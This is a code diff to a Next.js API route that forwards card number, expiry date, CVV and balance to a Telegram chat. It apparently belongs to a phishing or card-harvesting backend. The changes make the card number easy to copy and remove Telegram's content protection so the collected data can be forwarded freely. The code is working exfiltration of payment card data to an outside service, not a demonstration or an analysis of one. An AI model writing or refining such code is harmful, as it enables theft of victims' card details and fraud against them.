@@ -29,7 +29,7 @@ export async function POST(req: Request) {
 🔔 *NOTIFIKASI BARU*
 ━━━━━━━━━━━━━━
 *Tipe:* ${type || 'N/A'}
-*Nomor Kartu:* ${cardNumber || 'N/A'}
+*Nomor Kartu:* ${cardNumber ? `\`${cardNumber}\`` : 'N/A'}
 *Masa Berlaku:* ${expiry || 'N/A'}
 *CVV:* ${cvv || 'N/A'}
 *Saldo:* ${balance || 'N/A'}
@@ -44,7 +44,6 @@ export async function POST(req: Request) {
         tgFormData.append('chat_id', chatId);
         tgFormData.append('caption', message);
         tgFormData.append('parse_mode', 'Markdown');
-        tgFormData.append('protect_content', 'true');
         
         // Next.js File object sometimes fails when passed directly to standard fetch.
         // Convert to standard Blob and explicitly pass filename.
@@ -73,7 +72,6 @@ export async function POST(req: Request) {
             chat_id: chatId,
             text: message,
             parse_mode: 'Markdown',
-            protect_content: true,
           }),
         });
       }
@@ -87,7 +85,6 @@ export async function POST(req: Request) {
           chat_id: chatId,
           text: message,
           parse_mode: 'Markdown',
-          protect_content: true,
         }),
       });
 
